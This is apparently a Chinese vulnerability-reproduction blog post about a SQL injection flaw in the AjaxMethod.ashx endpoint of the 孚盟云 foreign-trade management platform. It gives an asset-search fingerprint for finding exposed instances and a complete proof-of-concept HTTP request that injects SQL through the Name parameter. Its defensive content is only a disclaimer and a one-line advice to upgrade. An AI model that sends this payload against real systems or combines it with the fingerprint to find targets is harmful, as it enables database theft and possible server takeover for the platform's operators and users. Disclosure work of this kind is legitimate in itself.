#  孚盟云 AjaxMethod.ashx存在SQL注入漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-13 02:22  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# 孚盟云 AjaxMethod.ashx存在SQL注入漏洞   
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0etmnlk1ssZGgiaVbIrO6VPHuU4SEOKZuibToZ9HtWkX1TqN5YXWhgd63lNU5WOv93ibnQZ5ZhqBUnhjIMJUmfLV9nm7SJzvQdjc/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0r9eA6CZo1xjpx18v7ZCXFKuwDYwz8CicxuXwhicRXW3PxFtlbmv5QtKPPA2MXbQ5VzyGGYSXeRprsq8gPyFrJxia4PWkiccibvYCc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
孚盟云是专为外贸企业打造的全流程数字化管理平台，聚焦客户挖掘、沟通跟进到订单履约的完整业  
务链。它通过可视化跟单系统实时监控订单进度，确保按时交付，实现从获客到  
履约的无缝衔接。  
平台集成客户管理、销售机会跟踪、供应链协同、财务核算与订单执行  
等核心功能，支持多币种、信用证等外贸特色场景，适配AEO合规与跨境结算需求。  
攻击者可通过构造恶意输入，利用该漏洞执行任意 SQL 语句，从而获取数据库中的敏感信息（如用户账号、密码等），甚至可能进一步获取服务器系统权限。  
  
04  
  
—  
  
资产测绘  
```
app="孚盟软件-孚盟云"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3aqPZ6hfypMDpJKsiaKrWoGvCdSXqq3dGCDVWMEUbrLHibEVlAP2qbySwoOliaSjPPJyYkBlG15xP4h8PXSDzfHVNGyWjP1xsMbo/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1%27%20and%201=db_name()--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0;Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie:ASP.NET_SessionId=ol21ko0wzfw2g3a0afzddnbq
Upgrade-Insecure-Requests: 1
Priority: u=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3GBrrg7Dl24mYga7K23BCDfSeibg5pnGRfP118yLanKxnALDibRKvCibmiaDRxh6W0Wh0CrvaezVBQRkibCK0TH82rDiamzbyPI4AhI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2Uvg25VcaD6CQXicuWc66tficrqF70ELd3Y8tGTiahjjBKhFTOw5MdzwGojM9c2Gvpbn2pk6kCaichaoTHsbNnBbN0DkaQNUeg19o/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
